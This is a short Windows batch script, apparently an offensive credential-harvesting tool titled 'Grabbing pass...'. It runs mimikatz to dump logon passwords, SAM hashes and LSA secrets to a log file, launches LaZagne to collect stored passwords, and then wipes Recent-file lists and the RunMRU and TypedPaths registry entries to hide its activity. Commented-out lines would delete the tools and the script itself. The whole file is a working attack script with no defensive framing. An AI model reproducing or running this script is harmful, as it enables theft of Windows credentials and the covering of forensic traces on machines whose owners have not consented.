mode con: cols=50 lines=30
color 03
cls
title Grabbing pass...
Echo off
Echo Grabbing pass...
Echo Do not close this window...

cd %~dp0

md !logs
if %PROCESSOR_ARCHITECTURE%==AMD64 (

.\mimikatz\x64\mimikatz.exe "privilege::debug" "log .\!logs\Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" lsadump::secrets exit
) else (.\mimikatz\x32\mimikatz.exe "privilege::debug" "log Result.txt" "sekurlsa::logonPasswords" "token::elevate" "lsadump::sam" lsadump::secrets exit) .\
mimikatz \miparser.vbs .\!logs\Result.txt
start .\lazagne\lazagne.bat

Del /F /Q %APPDATA%\Microsoft\Windows\Recent\*
Del /F /Q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*
Del /F /Q %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*
REG Delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ RunMRU /VA /F
REG Delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths /VA /F
exit

REM del mimikatz.exe /F /Q
REM del mimidrv.sys /F /Q
REM del mimilib.dll /F /Q
REM del %0

REM Echo .
REM pause > nul
